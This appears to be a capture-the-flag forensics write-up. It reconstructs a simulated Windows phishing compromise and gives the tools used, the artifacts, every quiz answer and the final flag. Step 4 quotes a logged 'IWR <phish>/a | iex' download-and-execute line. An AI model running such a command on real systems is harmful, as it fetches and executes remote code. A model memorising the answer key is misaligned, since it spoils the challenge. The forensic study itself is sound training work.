# TraceVX
* **Platform/Event:** TVX CTF
* **Category:** Forensics / DFIR (Windows endpoint, 440 pts)
* **Difficulty:** Hard
* **Flag:** `TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}`

## Objective
Reconstruct a 2026-09-17 compromise of `WIN-TRACE-01` from an AccessData **AD1** logical image (1199-file triage tree + a 2 MB `disk.img`) and answer a 10-question netcat quiz **in investigative order**. Each question allows two attempts; answering all ten returns the flag.

## Reconnaissance & Methodology
1. Parsed the AD1 with `dissect.target` (`Target.open(..., fs="ad1")`) — `7z`, `dfvfs` and `sleuthkit` all fail on this container. Extracted the full `C/` tree plus `disk.img`.
2. Tools used: `dissect.target`, `sqlite3`, `binwalk`, `dd`, `gzip`/`zcat`, `sha256sum`, `strings -el`, `jq`, `nc`.
3. Entry: Edge `History.jsonl.gz` → `cutt.ly/ms-portal-login` → `t2m.io` → punycode homoglyph. Cleartext host was XOR-encoded in `url_reputation.bin`; key `0x98 = (185+192+48+239) & 0xFF` (C2 octet sum) → `login-microsoftonline.secure-verify.cc`.
4. Execution: `PowerShell-Operational.evtx.jsonl.gz` EID 4104 showed `IWR <phish>/a | iex`; a crafted 178-byte UTF-16 `POWERSHELL.EXE-9A3B.pf` pinned `powershell.exe` at 14:32:18 as `Ahmed` (all other `.pf` are ASCII decoys).
5. Staging/persistence: `strings -el` on `$MFT.bin` and `$UsnJrnl.jsonl.gz` showed `stage.cmdline` created 14:32:20 and deleted 14:32:27 (7 s), plus `Navigator.exe` dropped to `C:\ProgramData\Microsoft\UpdateCache\`; scheduled task `TraceTelemetry.xml` (logon trigger, Ahmed) registered 14:32:40.
6. Payload: `binwalk` on `disk.img` found two gzip streams at `0x4D000` and `0x120000`; carved the first with `dd` → malicious PE (`OriginalFilename=NavigatorCore.dll`, C2 `185.192.48.239:443`); the second is a benign "Acme harmless" decoy.
7. Exfil: `SRUDB.sqlite` `network_usage` was mostly noise; filtered on `app IN ('Navigator.exe','AdaptConductor.exe')` and summed outbound bytes to the C2, excluding the inbound task-result row.

## Solution & Exploitation
* Decoys were filtered by the **14:3x timeline** and by *which process* actually talked to the C2: RFC-5737 IPs (`203.0.113.77`, `198.51.100.44`), 8 benign scheduled tasks, ASCII prefetch files, and the second gzip stream.
* Quiz answers: (1) `Ahmed` · (2) `login-microsoftonline.secure-verify.cc` · (3) `2026-09-17T14:31:51Z` · (4) `powershell.exe` · (5) `stage.cmdline` · (6) `Navigator.exe` · (7) SHA-256 `411ff3850c2ed96028e4f39184fed07c3fdacf56936e03581ce479c6ed7ab8cd` · (8) `TraceTelemetry` · (9) `185.192.48.239:443` · (10) `8388608` (8 MiB).
* Hash was taken on the **carved, decompressed** PE — hashing the decoy stream gives the wrong value.
* Final flag logic: `<user>@<host>_<task>-<c2ip>_<exfil>_<hash-prefix>` → `TVX{Ahmed@WIN-TRACE-01_TraceTelemetry-185.192.48.239_8MiB_411ff385}`.
